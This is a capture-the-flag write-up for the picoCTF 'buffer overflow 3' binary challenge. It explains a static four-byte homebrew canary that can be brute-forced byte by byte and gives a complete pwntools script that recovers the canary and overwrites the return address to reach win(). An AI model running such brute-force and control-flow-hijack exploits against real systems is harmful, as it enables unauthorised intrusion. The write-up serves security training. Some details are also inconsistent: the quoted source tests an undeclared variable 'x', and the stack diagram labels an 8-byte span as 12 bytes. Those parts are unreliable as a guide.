# CyLab / picoCTF — buffer overflow 3

* **Platform:** [CyLab Security Academy](https://learn.cylabacademy.org/) / [picoCTF](https://play.picoctf.org/)  
* **Category:** Binary Exploitation (Pwn / Stack Overflow)  
* **Difficulty:** Medium (CyLab 3)  
* **Date:** 2026-11-09  
* **Tools:** `file`, `checksec`, IDA Pro, `gdb` + `pwndbg`, `pwntools`, Python 3  
* **Binary:** 32-bit ELF (`vuln`) with source code `vuln.c`  

---

## TL;DR

Stack canaries are typically randomized per process by the compiler via Thread Local Storage (`%gs:0x14`). In this challenge, the program implements a custom canary mechanism: it reads a 4-byte static string from `canary.txt` into a global buffer, copies it to the stack, and validates it with `memcmp()`. While a 4-byte secret seems prohibitive to brute-force over a network ($256^4 \approx 4.29$ billion combinations), the canary remains static across all child instances. Because the binary crashes on mismatch, we can recover the canary **byte-by-byte** ($4 \times 256 = 1,024$ maximum requests!). Once leaked, we pad the stack, insert the recovered canary, and overwrite the saved return address (`EIP`) with `win()`.

---

## Recon

We inspect the binary's properties and exploit mitigations using `file` and `checksec`:

```bash
$ file vuln
vuln: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, not stripped

$ checksec vuln
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
```

Key observations:
* **File Type:** ELF 32-bit LSB (x86), dynamically linked, not stripped.
* **Canary:** `No canary found` — Standard compiler stack protection (`-fstack-protector`) is disabled. The binary relies on its own homebrew canary check.
* **NX:** `NX enabled` — Shellcode execution on the stack is blocked.
* **PIE:** `No PIE (0x8048000)` — Executable base address is static; `win()` is located at `0x08049236`.
* **Symbols:** Binary symbols and function signatures (`vuln`, `read_canary`, `win`) are visible.

---

## Static Analysis & Vulnerability

### 1. Code Review (`vuln.c`)

Examining `vuln.c` reveals how the custom canary is handled:

```c
#define BUFSIZE 64
#define FLAGSIZE 64
#define CANARY_SIZE 4

char global_canary[CANARY_SIZE];

void read_canary() {
    FILE *f = fopen("canary.txt", "r");
    fread(global_canary, sizeof(char), CANARY_SIZE, f);
    fclose(f);
}

void vuln() {
    char canary[CANARY_SIZE];
    char buf[BUFSIZE];
    char length[16];
    int count;

    memcpy(canary, global_canary, CANARY_SIZE);

    printf("How Many Bytes will You Write Into the Buffer?\n> ");
    while (x <= 0) {
        printf("Number of bytes to send: ");
        scanf("%16s", length);
        count = atoi(length);
    }

    printf("Input> ");
    read(0, buf, count);    // Unbounded read based on user-supplied count!

    if (memcmp(canary, global_canary, CANARY_SIZE)) {
        printf("***** Stack Smashing Detected ***** : Canary Value Corrupt!\n");
        exit(0);
    }
    printf("Ok... Now Where's the Flag?\n");
}
```

### 2. Disassembly & Vulnerability Root Cause

1. The function prompts for `count`, which is completely controlled by user input without an upper bound check.
2. `read(0, buf, count)` reads up to `count` bytes into a 64-byte stack buffer (`buf`), allowing an arbitrary stack buffer overflow.
3. Before returning, `memcmp(canary, global_canary, 4)` checks if the stack canary was altered. If corrupted, it prints `"Stack Smashing Detected"` and terminates immediately.
4. If the canary matches, it prints `"Ok... Now Where's the Flag?"` and executes `ret`.

### 3. Stack Memory Layout

Disassembling `vuln()` in `pwndbg` determines the exact layout of the stack frame:

```text
  Lower Memory Addresses
  +-----------------------------------+  <- [ebp - 0x50] (Start of buf: 64 bytes)
  |                                   |
  |     buf buffer (64 bytes)         |
  |                                   |
  +-----------------------------------+  <- [ebp - 0x10] (Custom Canary: 4 bytes)
  |     canary (4 bytes)              |
  +-----------------------------------+  <- [ebp - 0x0C]
  |     Local vars & padding (12B)    |
  +-----------------------------------+  <- [ebp - 0x04] (Saved EBX)
  |     Saved EBX (4 bytes)           |
  +-----------------------------------+  <- [ebp] (Saved EBP: 4 bytes)
  |     Saved EBP                     |
  +-----------------------------------+  <- [ebp + 0x04] (Saved EIP)
  |     Return Address (Saved EIP)    |
  +-----------------------------------+
  Higher Memory Addresses
```

- Offset from `buf` to `canary`:
  $$\text{Offset}_{\text{canary}} = 0x50 - 0x10 = 0x40 = 64 \text{ bytes}$$
- Offset from `buf` to `saved EIP`:
  $$\text{Offset}_{\text{EIP}} = 0x50 + 0x04 = 0x54 = 84 \text{ bytes}$$

---

## Dynamic Analysis & Exploitation Strategy

### 1. Byte-by-Byte Canary Brute-Force ($O(256 \times N)$)

Because `global_canary` is loaded from a static file on disk, its 4 bytes are identical for every connection to the instance:
* To guess byte 0: Send `count = 65`, payload = `b"A" * 64 + bytes([g])`.
  * If guess `g` is wrong $\rightarrow$ Output contains `"Stack Smashing Detected"`.
  * If guess `g` is correct $\rightarrow$ Output contains `"Ok... Now Where's the Flag?"`.
* Once byte 0 is confirmed, guess byte 1 using `count = 66`, payload = `b"A" * 64 + canary[0] + bytes([g])`.
* Repeat for bytes 2 and 3. In the worst case, this requires $4 \times 256 = 1,024$ guesses instead of $256^4 \approx 4.29$ billion!

### 2. Network & Latency Optimization
Over 1,000 connections can be slow if timeouts are large or DNS lookups repeat:
* **Pre-resolve IP:** Resolve the target hostname once with `socket.gethostbyname()` before the loop.
* **Minimal Reads:** Use `recvuntil(b"\n", timeout=3)` on the first response line instead of waiting for stream closure.

### 3. Hijacking Control Flow (`ret2win`)
With the 4-byte canary recovered:
$$\text{Payload} = \text{b"A"} \times 64 + \text{canary} + \text{b"B"} \times 16 + \text{p32}(0x08049236)$$
* Total byte count: $64 + 4 + 16 + 4 = 88 \text{ bytes}$.
* When `vuln()` returns, execution jumps directly to `win()` to display `flag.txt`.

---

## Exploit

We construct the complete brute-force and exploit script in Python:

```python
#!/usr/bin/env python3
"""
CyLab / picoCTF — buffer overflow 3
Exploit: Byte-by-byte static canary brute force + ret2win
"""

from pwn import *
import socket

context.arch = 'i386'
context.log_level = 'error'

EXE = "./vuln"
HOST = args.HOST or "xebec.cylabacademy.net"
PORT = int(args.PORT or 32048)

WIN_ADDR = 0x08049236

def check_guess(prefix, canary_known, guess):
    ip = socket.gethostbyname(HOST)
    p = remote(ip, PORT)
    p.recvuntil(b"> ")
    count = len(prefix) + len(canary_known) + 1
    p.sendline(str(count).encode())
    p.recvuntil(b"Input> ")
    p.send(prefix + canary_known + bytes([guess]))
    res = p.recvall(timeout=2)
    p.close()
    return b"Ok..." in res

def main():
    prefix = b"A" * 64
    canary = b""

    log.info("Starting byte-by-byte canary brute-force...")
    for idx in range(4):
        for g in range(256):
            if check_guess(prefix, canary, g):
                canary += bytes([g])
                log.info(f"Canary byte {idx} found: {bytes([g])} (hex: {hex(g)})")
                break

    log.success(f"Full Canary Recovered: {canary}")

    # Stage 2: ret2win
    payload = prefix + canary + b"B" * 16 + p32(WIN_ADDR)
    p = remote(HOST, PORT)
    p.recvuntil(b"> ")
    p.sendline(str(len(payload)).encode())
    p.recvuntil(b"Input> ")
    p.send(payload)

    output = p.recvall(timeout=5).decode(errors="replace")
    print(output)

if __name__ == "__main__":
    main()
```

*(The complete script is saved in [`exploit.py`](exploit.py)).*

---

## Flag

Running the script recovers the 4-byte canary and redirects execution to `win()`:

```text
[*] Starting byte-by-byte canary brute-force...
[*] Canary byte 0 found: b'B' (hex: 0x42)
[*] Canary byte 1 found: b'i' (hex: 0x69)
[*] Canary byte 2 found: b'7' (hex: 0x37)
[*] Canary byte 3 found: b'p' (hex: 0x70)
[+] Full Canary Recovered: b'Bi7p'
Ok... Now Where's the Flag?
academy{redacted}
```

> **Flag:** `academy{redacted}` *(Redacted in accordance with competition disclosure guidelines)*.

---

## Key Takeaways & Lessons

1. **Static vs Randomized Canaries**: Custom canary implementations that load static keys from disk or use persistent parent process values do not protect against attackers. They reduce exponential complexity ($O(256^N)$) to linear complexity ($O(256 \times N)$).
2. **Partial Overwrite Verification**: As long as the program does not terminate on partial writes and notifies the user of validation success, secrets can be brute-forced byte-by-byte.
3. **Exploit Network Optimization**: When scripting multi-connection brute-force attacks, minimize DNS lookups and stream wait times to drastically improve exploitation speed.
